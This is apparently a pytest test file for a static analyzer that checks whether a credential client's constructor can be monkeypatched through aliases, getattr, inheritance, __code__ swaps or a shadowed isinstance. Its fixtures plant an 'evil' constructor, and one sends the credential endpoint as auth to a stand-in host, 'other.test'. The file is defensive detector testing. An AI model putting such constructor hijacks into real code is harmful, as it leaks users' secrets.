"""Controls for the captured constructor-provider closure."""

import ast
import hashlib
from pathlib import Path
import textwrap

import pytest

from factoryline.credential_role_constructor_provider import (
    constructor_provider_bindings_inert,
)
from factoryline.credential_role_constructor_provider import SourceSnapshotIndex


def _index(files):
    root = Path(".")
    trees, raw, digests = {}, {}, {}
    for name, source in files.items():
        path = Path(name)
        content = textwrap.dedent(source).encode()
        tree = ast.parse(content)
        digest = hashlib.sha256(content).hexdigest()
        tree._oracle_source_sha256 = digest
        trees[path], raw[path], digests[path] = tree, content, digest
    return SourceSnapshotIndex(root, trees, raw, digests), trees


def _chain(index, trees, path="client.py", name="Client"):
    key = Path(path)
    owner = next(
        item
        for item in ast.walk(trees[key])
        if isinstance(item, ast.ClassDef) and item.name == name
    )
    return ((key, name, owner),)


def _inert(files, imports=None):
    index, trees = _index(files)
    return constructor_provider_bindings_inert(
        _chain(index, trees), index, imports or {}
    )


def test_clean_class_selector_declaration_remains_inert():
    assert _inert(
        {
            "client.py": """
                class Client: pass
                class Adapter:
                    client_class = Client
            """
        }
    )


@pytest.mark.parametrize(
    "holder_source",
    [
        "class Holder:\n    client_class = Client\n"
        "Holder.client_class.__init__ = evil\n",
        "class Holder:\n    client_class = Client\n"
        "Alias = Holder\nAlias.client_class.__init__ = evil\n",
        "class Holder:\n    client_class = Client\n"
        "holder = Holder()\n"
        "holder.client_class.__init__ = evil\n",
        "class Holder:\n    client_class = Client\n"
        "getattr(Holder, 'client_class').__init__ = evil\n",
    ],
    ids=["class-path", "class-alias", "holder-instance", "getattr"],
)
def test_related_selector_mutation_is_not_inert(holder_source):
    source = "class Client: pass\n" + holder_source
    assert not _inert({"client.py": source})


def test_exact_imported_holder_mutation_is_not_inert():
    index, trees = _index(
        {
            "client.py": "class Client: pass\n",
            "providers.py": "from client import Client\n"
            "class Holder:\n    client_class = Client\n",
            "consumer.py": "from providers import Holder as H\n"
            "H.client_class.__init__ = evil\n",
        }
    )
    imports = {
        Path("providers.py"): {"Client": (Path("client.py"), "Client")},
        Path("consumer.py"): {"H": (Path("providers.py"), "Holder")},
    }
    assert not constructor_provider_bindings_inert(_chain(index, trees), index, imports)


def test_uncertain_selector_holder_alias_fails_closed():
    assert not _inert(
        {
            "client.py": "class Client: pass\n"
            "class Holder:\n    client_class = Client\n"
            "if condition:\n    holder = Holder()\n"
            "holder.client_class.__init__ = evil\n"
        }
    )


def test_inherited_selector_mutation_is_not_inert():
    assert not _inert(
        {
            "client.py": "class Client: pass\n"
            "class Holder:\n    client_class = Client\n"
            "class Child(Holder): pass\n"
            "Child.client_class.__init__ = evil\n"
        }
    )


def test_unknown_inherited_selector_override_fails_closed():
    assert not _inert(
        {
            "client.py": "class Client: pass\n"
            "class Holder:\n    client_class = Client\n"
            "class Child(Holder):\n"
            "    if enabled:\n        client_class = Other\n"
        }
    )


def test_escaped_selector_owner_fails_closed():
    assert not _inert(
        {
            "client.py": "class Client: pass\n"
            "class Holder:\n    client_class = Client\n"
            "def leak():\n    return Holder\n"
        }
    )


def test_inherited_constructor_code_mutation_is_not_inert():
    assert not _inert(
        {
            "client.py": "class Client: pass\n"
            "class Sibling(Client): pass\n"
            "Sibling.__init__.__code__ = evil.__code__\n"
        }
    )


def test_clean_inherited_constructor_remains_inert():
    assert _inert({"client.py": "class Client: pass\nclass Sibling(Client): pass\n"})


def test_local_holder_instance_in_nested_block_remains_inert():
    assert _inert(
        {
            "client.py": "class Client: pass\n"
            "class Holder:\n    client_class = Client\n"
            "def build(request):\n"
            "    with lock:\n        holder = Holder(request)\n"
        }
    )


def test_local_holder_instance_selector_mutation_fails_closed():
    assert not _inert(
        {
            "client.py": "class Client: pass\n"
            "class Holder:\n    client_class = Client\n"
            "def build():\n"
            "    with lock:\n        holder = Holder()\n"
            "        holder.client_class.__init__ = evil\n"
        }
    )


def test_owner_method_receiver_selector_mutation_fails_closed():
    assert not _inert(
        {
            "client.py": "class Client: pass\n"
            "class Holder:\n    client_class = Client\n"
            "    def patch(self):\n"
            "        self.client_class.__init__ = evil\n"
            "holder = Holder()\nholder.patch()\n"
        }
    )


def test_class_field_alias_keeps_owner_mutation_provenance():
    assert not _inert(
        {
            "client.py": "class Client: pass\n"
            "class Holder:\n    client_class = Client\n"
            "class Provider:\n    adapter_class = Holder\n"
            "Provider.adapter_class.client_class.__init__ = evil\n"
        }
    )


@pytest.mark.parametrize(
    "body,tail,expected",
    [
        ("return isinstance(value, Holder)", "", True),
        ("value.client_class.__init__ = evil\nreturn True", "", False),
        ("opaque(value)\nreturn True", "", False),
        (
            "return isinstance(value, Holder)",
            "Consumer.inspect.__code__ = evil.__code__",
            False,
        ),
    ],
    ids=["safe-builtin", "owner-mutation", "opaque-call", "callee-rebound"],
)
def test_source_class_consumer_effects_are_proven_or_rejected(body, tail, expected):
    method_body = "\n".join("        " + line for line in body.splitlines())
    source = (
        "class Client: pass\nclass Holder:\n    client_class = Client\n"
        "class Consumer:\n    @classmethod\n    def inspect(cls, value):\n"
        + method_body
        + "\n"
        + tail
        + "\nConsumer.inspect(Holder)\n"
    )
    assert _inert({"client.py": source}) is expected


@pytest.mark.parametrize(
    "source",
    [
        "isinstance = predicate\ndef check(value): return isinstance(value, Holder)\n",
        "def check(isinstance, value): return isinstance(value, Holder)\n",
        "def outer():\n    isinstance = predicate\n"
        "    def check(value): return isinstance(value, Holder)\n",
        "import builtins as bi\nbi.isinstance = predicate\n"
        "def check(value): return isinstance(value, Holder)\n",
    ],
    ids=["module-binding", "parameter", "outer-closure", "builtins-mutation"],
)
def test_shadowed_or_mutated_isinstance_fails_closed(source):
    assert not _inert(
        {
            "client.py": "class Client: pass\n"
            "class Holder:\n    client_class = Client\n" + source
        }
    )


@pytest.mark.parametrize(
    "mutation",
    [
        "",
        "Client.__init__ = evil",
        "Client.__init__.__code__ = evil.__code__",
        "Holder.client_class.__init__ = evil",
        "Alias = Holder\nAlias.client_class.__init__ = evil",
        "holder = Holder()\nholder.client_class.__init__ = evil",
        "getattr(Holder, 'client_class').__init__ = evil",
        "class Sibling(Client): pass\nSibling.__init__.__code__ = evil.__code__",
    ],
)
def test_native_selector_proof_requires_unchanged_constructor(tmp_path, mutation):
    from factoryline.review_audits import security_scan

    source = (
        "import requests\n"
        "class Client:\n"
        "    def __init__(self, endpoint): self.endpoint = endpoint\n"
        "    def send(self): return requests.get(self.endpoint)\n"
        "class Adapter:\n"
        "    client_class = Client\n"
        "    ACCESS_TOKEN_URL = 'https://appleid.apple.com/auth/token'\n"
        "    def get_client(self): return self.client_class(self.ACCESS_TOKEN_URL)\n"
        "def evil(self, endpoint):\n"
        "    requests.get('https://other.test', auth=('u', endpoint))\n"
        "class Holder:\n"
        "    client_class = Client\n" + mutation + "\nAdapter().get_client()\n"
    )
    (tmp_path / "app.py").write_text(source, encoding="utf-8")
    result = security_scan(tmp_path, cache_enabled=False)
    findings = [
        item
        for item in result["findings"]
        if item["code"] == "SECURITY_HARDCODED_SECRET"
    ]
    primitive = [
        item
        for item in result.get("primitive_observations", [])
        if item["code"] == "SECURITY_HARDCODED_SECRET"
    ]
    assert len(findings) == bool(mutation)
    assert len(primitive) == (not mutation)
    assert (findings or primitive)[0]["severity"] == "CRITICAL"
